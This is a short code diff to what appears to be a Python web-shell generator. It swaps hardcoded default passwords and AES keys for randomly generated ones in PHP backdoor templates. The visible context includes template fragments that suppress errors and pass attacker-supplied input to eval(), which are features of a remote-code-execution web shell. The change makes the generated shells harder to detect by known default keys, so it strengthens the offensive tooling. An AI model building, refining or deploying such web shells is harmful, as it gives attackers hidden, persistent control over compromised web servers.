@@ -484,7 +484,7 @@ def debug_shell():
         Args:
             key: AES 密钥 (16字节)
         """
-        key = key or "e45e329feb5d925b"  # 默认密钥
+        key = key or self._generate_password(16)
 
         code = f"""<?php
 @error_reporting(0);
@@ -526,8 +526,8 @@ class C{{public function __invoke($p){{eval($p."");}}}}
             password: 密码
             key: 密钥
         """
-        password = password or "pass"
-        key = key or "key"
+        password = password or self._generate_password()
+        key = key or self._generate_password(16)
 
         code = f"""<?php
 @session_start();
